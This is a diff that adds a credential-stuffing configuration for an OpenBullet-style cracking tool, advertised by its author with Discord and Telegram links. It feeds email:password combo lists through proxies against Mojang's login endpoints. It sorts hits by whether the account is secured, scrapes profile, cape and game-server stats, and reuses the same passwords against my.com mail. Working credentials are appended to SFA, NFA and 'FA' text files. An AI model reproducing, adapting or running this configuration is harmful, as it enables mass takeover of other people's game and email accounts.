@@ -1,0 +1,300 @@
+[SETTINGS]
+{
+  "Name": "Minecraft FullCapture COMBO2022",
+  "SuggestedBots": 50,
+  "MaxCPM": 5,
+  "LastModified": "2022-03-01T02:58:19.8811051+00:00",
+  "AdditionalInfo": "La capture puede dar Skypping Hits, para evitar usar Proxys HQ - Join to https://discord.gg/Kibi",
+  "Author": "SELLER_COMBO2021",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 10,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://authserver.mojang.com/authenticate" 
+  CONTENT "{\"agent\" : { \"name\" : \"Minecraft\", \"version\" : \"1\"},\"clientToken\" : \"1a3bceddf9b448c9ae86cd1fc20abffc\",\"password\" : \"<PASS>\",\"requestUser\" : \"false\",\"username\" : \"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: authserver.mojang.com" 
+  HEADER "User-Agent: MinecraftLauncher/2.2.8542(Windows 10 Home; 10.0; x86_64)" 
+  HEADER "Accept: */*" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 211" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "accessToken" 
+  KEYCHAIN Retry OR 
+    KEY "Unable to connect to the HTTP-server 'authserver.mojang.com'." 
+  KEYCHAIN Failure OR 
+    KEY "{\"error\":\"ForbiddenOperationException\",\"errorMessage\":\"Forbidden\"}" 
+    KEY "{\"error\":\"ForbiddenOperationException\",\"errorMessage\":\"Invalid credentials. Invalid username or password.\"}" 
+
+PARSE "<SOURCE>" LR ":{\"name\":\"" "\",\"" CreateEmpty=FALSE -> CAP "Username" 
+
+PARSE "<SOURCE>" JSON "accessToken" JTokenParsing=TRUE -> VAR "token" 
+
+PARSE "<SOURCE>" LR "<Username>\",\"id\":\"" "\"}" -> VAR "UUID" 
+
+REQUEST GET "https://api.minecraftservices.com/minecraft/profile" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: es-ES,es;q=0.9" 
+  HEADER "authorization: Bearer <token>" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "origin: https://www.minecraft.net" 
+  HEADER "referer: https://www.minecraft.net/" 
+  HEADER "sec-ch-ua: \" Not;A Brand\";v=\"99\", \"Google Chrome\";v=\"91\", \"Chromium\";v=\"91\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\" : \"ACTIVE\"," 
+    KEY "\" : \"CLASSIC\"" 
+    KEY "\" : \"SLIM\"" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "\"NOT_FOUND\"," 
+
+REQUEST POST "https://account.mojang.com/login" 
+  CONTENT "authenticityToken=<token>&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9,fr;q=0.8,ar;q=0.7" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 231" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Host: account.mojang.com" 
+  HEADER "Origin: https://account.mojang.com" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://account.mojang.com/login" 
+  HEADER "sec-ch-ua: \"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36" 
+
+PARSE "<SOURCE>" LR "<p>" ". " -> VAR "CSFA" 
+
+IF "<CSFA>" Contains "Your account has not been secured"
+SET CAP "Type" "SFA"
+ELSE
+SET CAP "Type" "NFA"
+ENDIF
+
+REQUEST GET "https://api.minecraftservices.com/minecraft/profile/namechange" 
+  
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Authorization: Bearer <token>" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: api.minecraftservices.com" 
+  HEADER "Origin: https://www.minecraft.net" 
+  HEADER "Referer: https://www.minecraft.net/" 
+  HEADER "sec-ch-ua: \" Not;A Brand\";v=\"99\", \"Microsoft Edge\";v=\"91\", \"Chromium\";v=\"91\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Edg/91.0.864.59" 
+
+PARSE "<SOURCE>" JSON "createdAt" CreateEmpty=FALSE -> CAP "Creación de la Cuenta" 
+
+REQUEST GET "http://s.optifine.net/capes/<Username>.png" 
+  
+  HEADER "Host: s.optifine.net" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7" 
+
+IF "<SOURCE>" Contains "Not found"
+SET CAP "Optifine" "❌"
+ELSE
+SET CAP "Optifine" "✔️"
+ENDIF
+
+REQUEST GET "https://crafatar.com/capes/<UUID>" 
+  
+  HEADER "Host: crafatar.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: none" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7" 
+
+IF "<RESPONSECODE>" Contains "404"
+SET CAP "MojangCape" "❌"
+ELSE
+SET CAP "MojangCape" "✔️"
+ENDIF
+
+REQUEST GET "https://www.mineplex.com/players/<Username>" 
+  
+  HEADER "Host: www.mineplex.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: none" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7" 
+
+IF "<SOURCE>" Contains "That player cannot be found."
+SET CAP "No-MineplexLogin" "✔️"
+ELSE
+SET CAP "No-MineplexLogin" "❌"
+ENDIF
+#PRUEBA !PARSE "<SOURCE>" LR "$('.www-mp-rank').html(Util.prettyRank('" "'));" CreateEmpty=FALSE -> CAP "Rank Mineplex" 
+
+REQUEST GET "https://api.slothpixel.me/api/players/<UUID>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Retry OR 
+    KEY "{\"error\":\"An error occurred while getting the player UUID\"}" 
+
+IF "<SOURCE>" Contains "Player has no Hypixel stats"
+SET CAP "No-HypixelLogin" "✔️"
+ELSE
+SET CAP "No-HypixelLogin" "❌"
+ENDIF
+
+PARSE "<SOURCE>" LR "rank\":\"" "\",\"" CreateEmpty=FALSE -> CAP "Rango" 
+
+PARSE "<SOURCE>" LR "level\":" ",\"" CreateEmpty=FALSE -> CAP "Nivel" 
+
+PARSE "<SOURCE>" LR "SkyWars\":{\"coins\":" "," CreateEmpty=FALSE -> CAP "SkyWars Coins" 
+
+PARSE "<SOURCE>" LR "BedWars\":{\"coins\":" "," CreateEmpty=FALSE -> CAP "BedWars Coins" 
+
+PARSE "<SOURCE>" LR "last_login\":" ",\"" -> VAR "lastlogin" 
+
+FUNCTION UnixTimeToDate "yyyy-MM-dd:HH-mm-ss" "<lastlogin>" -> CAP "Ultima Conexión" 
+
+#PRUEBA !REQUEST GET "https://sky.lea.moe/stats/<UUID>"
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+#PRUEBA !REQUEST GET "https://www.veltpvp.com/u/Stepney" 
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+
+!PARSE "<SOURCE>" LR "rank\":\"" "\",\"" CreateEmpty=FALSE -> CAP "Rango" 
+
+REQUEST POST "https://aj-https.my.com/cgi-bin/auth?Lang=en_US&mp=android&mmp=mail&DeviceID=&client=mobile&udid=&instanceid=cEHwYCtZfcM&playservices=212116037&connectid=&os=Android&os_version=10&ver=com.my.mail13.13.1.33372&appbuild=33372&vendor=Xiaomi&model=Redmi%20Note%209S&device_type=tablet&country=US&language=en_US&timezone=GMT%2B02%3A00&device_name=Xiaomi%20Redmi%20Note%209S&DeviceInfo=%7B%22OS%22%3A%22Android%22%2C%22AppVersion%22%3A%22com.my.mail13.13.1.33372%22%2C%22AppBuild%22%3A%2233372%22%2C%22Device%22%3A%22Redmi%20Note%209S%22%2C%22Timezone%22%3A%22GMT%2B02%3A00%22%2C%22DeviceName%22%3A%22Xiaomi%20Redmi%20Note%209S%22%2C%22Useragent%22%3A%22Mozilla%5C%2F5.0%20(Linux%3B%20Android%2010%3B%20Redmi%20Note%209S%20Build%5C%2FQKQ1.191215.002%3B%20wv)%20AppleWebKit%5C%2F537.36%20(KHTML%2C%20like%20Gecko)%20Version%5C%2F4.0%20Chrome%5C%2F91.0.4472.120%20Mobile%20Safari%5C%2F537.36%22%2C%22playservices%22%3A%22212116037%22%2C%22connectid%22%3A%224a93e679058284a39a7d6da21038cf5b%22%7D&idfa=<idfa>&appsflyerid=&current=google&first=google&md5_signature=<ms>" 
+  CONTENT "Password=<PASS>&oauth2=0&Login=<USER>&mobile=1&mob_json=1&simple=1&useragent=android&md5_post_signature=defbd7686b82ef1f17d3a1145aac0263" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: mobmail android 13.13.1.33372 com.my.mail" 
+  HEADER "X-Mobile-App: <xma>" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Host: aj-https.my.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "Content-Length: 150" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Ok=1" 
+    KEY "Ok=0" 
+  KEYCHAIN Ban OR 
+    KEY "fail=1" 
+    KEY "fail=0" 
+    KEY "captcha_type=0" 
+
+PARSE "<SOURCE>" LR ",\"" "\"]" -> VAR "MFA" 
+
+IF "<MFA>" Contains "Ok=1"
+SET CAP "Minecraft FA" "✔️"
+ELSE
+SET CAP "Minecraft FA" "❌"
+ENDIF
+
+FUNCTION Constant "COMBO2021 - Join T.ME/COMBO2021" -> CAP "Config de" 
+
+IF "<CSFA>" Contains "Your account has not been secured"
+
+UTILITY File "SFA.txt" AppendLines "<USER>:<PASS>" -> VAR "1" 
+
+ELSE
+
+UTILITY File "NFA.txt" Move "<FOLDER>" AppendLines "<USER>:<PASS>" 
+
+ENDIF
+IF "<MFA>" Contains "Ok=1"
+
+UTILITY File "Minecraft FA.txt" AppendLines "<USER>:<PASS>" 
+ELSE
+ENDIF
+
